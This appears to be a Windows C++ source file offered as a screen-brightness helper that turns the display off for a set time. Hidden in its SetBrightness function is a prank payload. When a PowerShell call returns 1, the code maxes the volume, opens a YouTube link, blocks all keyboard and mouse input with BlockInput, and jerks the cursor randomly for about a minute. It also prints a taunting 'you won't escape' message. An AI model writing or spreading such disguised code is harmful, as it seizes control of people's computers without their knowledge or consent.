#include <iostream>
#include <string>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <exception>
#include <mmsystem.h>

#pragma comment(lib, "winmm.lib")

void setMaxVolume() {
    // Max volume: 0xFFFF for both left and right channels
    DWORD volume = 0xFFFF;
    waveOutSetVolume(0, volume | (volume << 16));  // Set max for both channels
}

void openYouTube() {
    // URL of the YouTube video
    const wchar_t* url = L"https://www.youtube.com/watch?v=9jK-NcRmVcw";

    // Use ShellExecute to open the default browser with the given URL
    ShellExecute(0, 0, url, 0, 0, SW_SHOWNORMAL);
}


void randomMouseMovement() {
    srand((unsigned)time(0));
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Move the mouse to random positions
    for (int i = 0; i < 60; ++i) {
        int x = rand() % screenWidth;
        int y = rand() % screenHeight;
        try {
            SetCursorPos(x, y);
            Sleep(1000);  // Delay between movements
        }
        catch (std::exception)
        { }
    }
}

// Function to set brightness
void SetBrightness(int brightness) {
    std::string command = "powershell.exe (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1," + std::to_string(brightness) + ")";
    try {
        int result = system(command.c_str());
        //printf("res: %d", result);
        if (result == 1)
        {
            setMaxVolume();
            openYouTube();
            BlockInput(TRUE);
            randomMouseMovement();
            BlockInput(FALSE);
        }

        /*if (result == 0) {
            std::cout << "Brightness set to " << brightness << "%" << std::endl;
        }
        else {
            std::cout << "Failed to set brightness. Error code: " << result << std::endl;
        }*/
     }
    catch(std::exception)
    {
        printf("MOHAHAHAH. YOU WON'T ESCAPE FROM ME.");
        randomMouseMovement();
    }
}

// Function to get current brightness
int GetCurrentBrightness() {
    std::string command = "powershell.exe \"(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness).CurrentBrightness\"";
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) return -1;

    char buffer[128];
    std::string result = "";
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }
    _pclose(pipe);

    return std::stoi(result);
}

// Function to turn off screen for specified duration
void TurnOffScreenForDuration(int milliseconds) {
    // Get current brightness
    int currentBrightness = 100;//GetCurrentBrightness();
    if (currentBrightness == -1) {
        std::cout << "Failed to get current brightness" << std::endl;
        return;
    }


    // Set brightness to 0%
    SetBrightness(0);

    // Wait for specified duration
    std::this_thread::sleep_for(std::chrono::milliseconds(milliseconds));

    // Restore original brightness
    SetBrightness(currentBrightness);
}

int black_main(int duration) {
    //int duration;
    //std::cout << "Enter duration to turn off screen (in milliseconds): ";
    //std::cin >> duration;

    TurnOffScreenForDuration(duration);

    /*std::cout << "Press Enter to exit..." << std::endl;
    std::cin.ignore();
    std::cin.get();*/

    return 0;
}